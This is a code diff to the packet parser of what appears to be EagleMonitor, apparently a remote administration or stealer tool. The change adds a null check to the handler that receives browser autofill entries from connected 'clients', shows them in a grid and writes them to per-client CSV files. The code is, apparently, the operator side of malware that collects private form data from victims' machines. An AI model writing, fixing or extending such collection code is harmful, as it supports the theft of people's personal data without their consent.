@@ -19,33 +19,37 @@ namespace EagleMonitor.PacketParser
             {
                 if (!System.IO.Directory.Exists(clientHandler.clientPath + "\\Autofill\\"))
                     System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\Autofill");
-
-                try
+                if (autofillPacket.autofillList != null)
                 {
-                    if (clientHandler.autofillForm.dataGridView1 != null)
+                    try
                     {
-                        clientHandler.autofillForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
+                        if (clientHandler.autofillForm.dataGridView1 != null)
                         {
-                            clientHandler.autofillForm.dataGridView1.Rows.Clear();
-                            foreach (object[] str in autofillPacket.autofillList)
+                            clientHandler.autofillForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                             {
-                                int rowId = clientHandler.autofillForm.dataGridView1.Rows.Add();
-                                DataGridViewRow row = clientHandler.autofillForm.dataGridView1.Rows[rowId];
-                                row.Cells["Column1"].Value = str[0].ToString();
-                                row.Cells["Column2"].Value = str[1].ToString();
-                                row.Cells["Column3"].Value = str[2].ToString();
-                                row.Cells["Column4"].Value = str[3].ToString();
-                                row.Cells["Column5"].Value = str[4].ToString();
-                            }
-                            Miscellaneous.ToCSV(clientHandler.autofillForm.dataGridView1, clientHandler.clientPath + "\\Autofill\\" + Utils.Miscellaneous.DateFormater() + ".csv");
-                            clientHandler.autofillForm.loadingCircle1.Visible = false;
-                            clientHandler.autofillForm.loadingCircle1.Active = false;
-                        }));
+                                clientHandler.autofillForm.dataGridView1.Rows.Clear();
+                                foreach (object[] str in autofillPacket.autofillList)
+                                {
+                                    int rowId = clientHandler.autofillForm.dataGridView1.Rows.Add();
+                                    DataGridViewRow row = clientHandler.autofillForm.dataGridView1.Rows[rowId];
+                                    row.Cells["Column1"].Value = str[0].ToString();
+                                    row.Cells["Column2"].Value = str[1].ToString();
+                                    row.Cells["Column3"].Value = str[2].ToString();
+                                    row.Cells["Column4"].Value = str[3].ToString();
+                                    row.Cells["Column5"].Value = str[4].ToString();
+                                }
+                                Miscellaneous.ToCSV(clientHandler.autofillForm.dataGridView1, clientHandler.clientPath + "\\Autofill\\" + Utils.Miscellaneous.DateFormater() + ".csv");
+                                clientHandler.autofillForm.loadingCircle1.Visible = false;
+                                clientHandler.autofillForm.loadingCircle1.Active = false;
+                            }));
+                        }
+                        else
+                        { Miscellaneous.ToCSV(autofillPacket.autofillList, clientHandler.clientPath + "\\Autofill\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
                     }
-                    else
-                    { Miscellaneous.ToCSV(autofillPacket.autofillList, clientHandler.clientPath + "\\Autofill\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
+                    catch { Miscellaneous.ToCSV(autofillPacket.autofillList, clientHandler.clientPath + "\\Autofill\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
                 }
-                catch { Miscellaneous.ToCSV(autofillPacket.autofillList, clientHandler.clientPath + "\\Autofill\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
+                else
+                    return;
             }).Start();
         }
     }
